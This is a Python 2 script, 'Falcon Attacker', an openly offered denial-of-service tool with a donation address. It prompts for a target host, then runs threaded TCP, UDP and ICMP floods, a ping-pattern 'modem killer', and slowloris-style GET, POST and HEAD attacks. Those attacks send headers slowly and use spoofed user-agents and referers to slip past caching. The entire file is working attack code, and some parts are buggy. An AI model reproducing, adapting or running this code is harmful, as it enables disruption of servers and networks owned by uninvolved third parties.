#!/usr/bin/env python

#Falcon Attacker By SillyWalker, Version 1.
#1LGJhVQeJZ1RQXjkm3VWdJxE4Gz88tk2Y2

import socket
import string
import random
import time
import threading
import thread
import os
import sys

os.system('cls' if os.name == 'nt' else 'clear')
print "Falcon Attacker, Release 1, written in Python.\nSourceForge: https://sourceforge.net/projects/falcon-attacker/\nDonate BTC: 1LGJhVQeJZ1RQXjkm3VWdJxE4Gz88tk2Y2\nPRESS Ctrl+\ TO STOP ATTACK!!!!!!\n------Server Burning Ready!------\n"
print "GET=GET HTTP Attack, POST=POST HTTP Attack, TCP = TCP FLOOD, UDP = UDP FLOOD, ICMP= PING FLOOD, HEAD=Grab Website's Head Instead Of Full Page, MK=ICMP flood that causes modems to hang up, ALL=All attack vectors, \n"
debug = raw_input("Debug?[Y/N]:	")
getorpost = raw_input("GET/POST/TCP/UDP/ICMP/HEAD/MK/ALL: ") #Do a GET or POST attack..
resolveurl = raw_input("Resolve URL To IP Before Attacking? Saves bandwidth, increases power, doesn't work on some servers[Y/N]: ")
if getorpost == "TCP" or getorpost == "UDP":
	dns = raw_input("IP: ") #IP to attack.
	port = raw_input("Port: ") #Server's port to attack on.
	threads = raw_input("CPU Threads: ") #Number of CPU threads to use concurrently.
	message = raw_input("Message: ") #Message to send the server.
	raw_input("Press Any Key To Start DoS Attack With Paramaters IP: " + dns + " Port " + port + " Threads: " + threads + "")
elif getorpost == "POST" or getorpost == "GET" or getorpost == "HEAD":
    dns = raw_input("HOST: ") #IP to attack.
    port = raw_input("Port: ") #Server's port to attack on.
    keeporclose = raw_input("Keep-Alive Or Close? 1/2: ")
    page = raw_input("page [including slash]: ") #Page to ask for and get sent back.
    threads = raw_input("CPU Threads: ") #Number of CPU threads to use concurrently.
    servertimeout = raw_input("Server Timeout[RAND for random]: ") #Remote Server Timeout Window.
    timebetweenheaderse = raw_input("Time Between Each HTTP Header Is Sent[RAND for random]: ")
    raw_input("Press Any Key To Start DoS Attack With Paramaters Host: " + dns + " Port: " + port + " Page: " + page + " Threads: " + threads + " TimeBetweenHeaders: " + timebetweenheaderse + " Timeout: " + servertimeout + "")
elif getorpost == "ICMP":
	print "Minimum Interval Allowed For Non-Root On Linux Is .200"
	dns = raw_input("HOST: ")
	threads = raw_input("CPU Threads: ")
	psize = raw_input("Packet Size[max 65500][RAND for random][decimals & 0 allowed]: ")
	intervaly = raw_input("Interval(delay each packet)[0 & decimals work]: ")
	raw_input("Press Any Key To Start DoS Attack With Paramaters HOST: " + dns + " Threads: " + threads + " Packet Size: " + psize + " Interval " + intervaly + "")
elif getorpost == "MK":
	dns = raw_input("HOST: ")
	threads = raw_input("CPU Threads: ")
	intervaly = raw_input("Interval(delay each packet)[0 & decimals work]: ")
	raw_input("Press Any Key To Start DoS Attack With Paramaters HOST: " + dns + " Threads: " + threads  + " Interval " + intervaly + "")
elif getorpost == "ALL":
	print "Minimum 5 threads or else program will b0rk, must be divisible and 5's i.e 5, 10, 15, 20, 25."
	dns = raw_input("HOST: ")
	threads = input("CPU Threads: ")
	intervaly = raw_input ("ICMP Interval(delay each packet)[0 & decimals work]: ")
	psize = raw_input("ICMP Packet Size[max 65500][RAND for random][decimals & 0 allowed]: ")
	timebetweenheaderse = raw_input("Time Between GET/HEAD/POST Headers[RAND for random]: ")
	servertimeout = raw_input("GET/HEAD/POST Server Timeout[RAND for random]: ")
	page = raw_input("GET/HEAD/POST Page: ")
	keeporclose = raw_input("GET/HEAD/POST  Keep-Alive Or Close? [1/2]: ")
	port = raw_input("TCP/UDP/GET/HEAD/POST PORT: ")
	message = raw_input("TCP/UDP MESSAGE: ")
	raw_input("Press Enter To Attack.")
try:
	if resolveurl == "Y":
		print "Grabbing " + dns + "'s IP..."
		remote_ip = socket.gethostbyname( dns )
		print "IP found: " + remote_ip + " = " + dns;
		time.sleep(0.5)
	else:
		remote_ip = dns
except Exception, e:
	print "error grabbing IP address of hostname " + ddos + " - Using DNS, host might be down, you mistyped it or your net is b0rked.";
	remote_ip = dns
	pass
#Common user-agents, what browser the client tells the server its using, this is used for valid HTTP requests, bypassing caching and stealth.
useragents = [

 "Mozilla/5.0 (iPhone; CPU iPhone OS 5_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B179 Safari/7534.48.3",
 "Mozilla/5.0 (iPod; CPU iPhone OS 5_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B176 Safari/7534.48.3",
 "Mozilla/5.0 (iPad; CPU OS 5_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B176 Safari/7534.48.3",
 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/536.25 (KHTML, like Gecko) Version/6.0 Safari/536.25",
 "Mozilla/5.0 (Windows; Windows NT 6.1) AppleWebKit/534.57.2 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2",
 "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)",
 "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0)",
 "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)",
 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.46 Safari/536.5",
 "Mozilla/5.0 (Windows; Windows NT 6.1) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.46 Safari/536.5",
 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:11.0) Gecko/20100101 Firefox/11.0",
 "Mozilla/5.0 (Windows NT 6.1; rv:11.0) Gecko/20100101 Firefox/11.0",
 "Opera/9.80 (Macintosh; Intel Mac OS X 10.7.4; U; en) Presto/2.10.229 Version/11.62",
 "Opera/9.80 (Windows NT 6.1; U; en) Presto/2.10.229 Version/11.62",
 
]


#Referers, where the client says it clicked this page, same reasons as user-agents.
referers = [

 "http://www.google.com/search?q=" +dns + "&ie=utf-8&oe=utf-8&aq=t&rls=org.mozilla:en-US:official&client=firefox-a",
 "http://search.aol.ca/aol/search?enabled_terms=&s_it=comsearch51&q=" + dns + "", # + "" is needed or else it will return a error, no idea why.
 "http://duckduckgo.com/?q=hope" + dns + "",
 "http://www.bing.com/search?q=" + dns + "&go=&qs=bs&form=AAAA&filt=all",
 "http://www.ixquick.com/do/search",
 "http://www.ask.com/web?q=" + dns + "&search=&qsrc=0&o=0&l=dir",
 "http://" + dns + "/",

]


def sleepclear():
    time.sleep(0.2)
    os.system('cls' if os.name == 'nt' else 'clear')

class wheel(threading.Thread):
	def run(self):
		time.sleep(1)
		while 1:
			sleepclear()
			print "|				Burning Server, please wait..."
			sleepclear()
			print "/				Burning Server, please wait..."
			sleepclear()
			print "-				Burning Server, please wait..."
			sleepclear()
			print "\\				Burning Server, please wait..."
class TCPF(threading.Thread):
	def run(self):
		p=0
		try:
			while 1:
				del p
				p = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
				p.connect((str(remote_ip), int(port)))
				p.send(str(message))
				p.send(random.choice(string.letters+string.digits))
				p.close
		except Exception, e:
			print "error"
			pass
		
class ICMPF(threading.Thread):
	def run(self):
		if os.name == "nt":
			if psize == "RAND":
				try:
					os.system("ping " + dns + " -s " + str(random.randrange(0,65500)) + " -t")
				except Exception, e:
					print "error"
					pass
			else:
				try:
					os.system("ping " + dns + " -s " + str(psize) + " -t")
				except Exception, e:
					print "error"
					pass
		else:
			if psize == "RAND":
				try:
					if getorpost == "ALL":
						os.system("ping -i " + str(intervaly) + " -s " + str(random.randrange(0,65500)) + " -W 1 " + str(remote_ip))
					else:
						os.system("ping -i " + str(intervaly) + " -s " + str(random.randrange(0,65500)) + " -W 1 " + "-f " + str(remote_ip))
				except Exception, e:
					print "error"
					pass
			else:
				try:
					if getorpost == "ALL":
						os.system("ping -i " + str(intervaly) + " -s " + str(psize) + " -W 1 " + str(remote_ip))
					else:
						os.system("ping -i " + str(intervaly) + " -s " + str(psize) + " -W 1 " + "-f " + str(remote_ip))
				except Exception, e:
					print "error"
					pass

class MKK(threading.Thread):
	def run(self):
		try:
			if getorpost == "ALL":
				os.system("ping -i " + str(intervaly) + " -p 2B2B2B41544829 " + dns)
			else:
				os.system("ping -i " + str(intervaly) + " -p 2B2B2B41544829 -f " + dns)
		except Exception, e:
			print "error"
			pass

class UDPF(threading.Thread):
	def run(self):
		o=0
		try:
			while 1:
				del o
				o = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
				o.sendto(str(message), (str(remote_ip), int(port)))
				o.sendto(random.choice(string.letters+string.digits), (str(remote_ip), int(port)))
				o.close
		except Exception, e:
			print "error"
			pass
		
class ddos(threading.Thread):
    def run(self):
        s=0
        time.sleep(random.randrange(0,5))
        try:
            while 1:
                 if timebetweenheaderse == "RAND":
					 timebetweenheaders = random.randrange(0,20)
                 else:
                     timebetweenheaders = int(timebetweenheaderse)
                 del s #delete the socket after it's used so you won't get "Bad File Descriptor" error.
                 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #Create a socket.
                 s.connect((str(remote_ip), int(port))) #Connect to server.
                 if getorpost == "GET":
                     s.send("GET "+str(page)+" HTTP/1.1\r\n")
                 elif getorpost == "POST":
					 s.send("POST "+str(page)+" HTTP/1.1\r\n")
                 else:
					s.send("HEAD "+str(page)+" HTTP/1.1\r\n")
                 time.sleep(int(timebetweenheaders))
                 s.send("Host: "+str(dns)+"\r\n")
                 time.sleep(int(timebetweenheaders))
                 s.send("User-Agent: "+random.choice(useragents)+"\r\n")
                 time.sleep(int(timebetweenheaders))
                 s.send("Cache-Control: no-cache")
                 time.sleep(int(timebetweenheaders))
                 s.send("Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7")
                 time.sleep(int(timebetweenheaders))
                 s.send("Referer: "+random.choice(referers)+"")
                 time.sleep(int(timebetweenheaders))
                 if getorpost == 2 or getorpost == "2" or getorpost == '2':
       	             s.send("Connection: close")
                 else:
					s.send("Connection: keep-alive")
                 time.sleep(int(timebetweenheaders))
                 s.send("Content-Length "+str(random.randrange(10000,1000000))+"\r\n")
                 time.sleep(int(timebetweenheaders))
                 s.send("Content-Type: application/x-www-form-urlencoded\r\n\r\n")
                 time.sleep(int(timebetweenheaders))
                 s.send(random.choice(string.letters)+random.choice(string.digits)) #Send some random data through the already-existing connection to prevent caching and obfuscation.
                 time.sleep(float(servertimeout))
                 s.close() #close socket, stop sending HTTP headers, server returns data to you
        except Exception, e:
            print "error"
            pass


allthread = int(threads) / 5
print "Starting Threads..."
time.sleep(0.5)
if getorpost == "ICMP":
	for i in range(int(threads)):
		t = ICMPF()
		t.start()
		print "ICMP Attack Thread " + str(i) + " Started!"
elif getorpost == "UDP":
	for i in range(int(threads)):
		t = UDPF()
		t.start()
		print "UDP Attack Thread " + str(i) + " Started!"
elif getorpost == "TCP":
	for i in range(int(threads)):
		t = TCPF()
		t.start()
		print "TCP Attack Thread " + str(i) + " Started!"
elif getorpost == "GET":
	for i in range(int(threads)):
		t = ddos()
		t.start()
		print "GET Attack Thread " + str(i) + " Started!"
elif getorpost == "HEAD":
	for i in range(int(threads)):
		t = ddos()
		t.start()
		print "HEAD_GET Attack Thread " + str(i) + " Started!"
elif getorpost == "POST":
		for i in range(int(threads)):
			t = ddos()
			t.start()
			print "POST Attack Thread " + str(i) + " Started!"
elif getorpost == "MK":
	for i in range(int(threads)):
		t = MKK()
		t.start()
		print "Modem Killer Thread " + str(i) + " Started!"
elif getorpost == "ALL":
	for i in range(int(allthread)):
		t = ddos()
		t.start()
		print "All Attacks Thread " + str(i) + " Started!"
	for i in range(int(allthread)):
		t = MKK()
		t.start()
		print "All Attacks Thread " + str(i) + " Started!"
	for i in range(int(allthread)):
		t = ICMPF()
		t.start()
		print "All Attacks Thread " + str(i) + " Started!"
	for i in range(int(allthread)):
		t = TCPF()
		t.start()
	for i in range(int(allthread)):
		t = UDPF()
		t.start
		print "All Attacks Thread " + str(i) + " Started!"
if debug == "Y":
	print "Verbose mode."
else:
	time.sleep(1)
	t = wheel()
	t.start()
print "Finished Starting Attack Threads!"
